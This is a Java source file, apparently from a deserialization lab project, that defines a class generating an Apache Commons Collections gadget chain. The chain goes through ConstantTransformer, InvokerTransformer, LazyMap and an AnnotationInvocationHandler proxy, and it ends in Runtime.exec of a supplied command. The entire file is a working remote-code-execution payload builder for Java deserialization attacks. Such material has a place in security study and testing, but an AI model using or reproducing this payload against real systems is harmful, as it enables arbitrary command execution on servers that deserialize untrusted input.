package com.project01.javadeserialization.dto;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollectionsGadget implements Serializable {

    private static final long serialVersionUID = 1L;

    public static Object createRCEPayload(String command) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{command})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // LazyMap + Proxy để trigger
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);

        // AnnotationInvocationHandler (common trigger)
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
        return Proxy.newProxyInstance(
                ClassLoader.getSystemClassLoader(),
                new Class[]{java.lang.annotation.Annotation.class},
                handler
        );
    }
}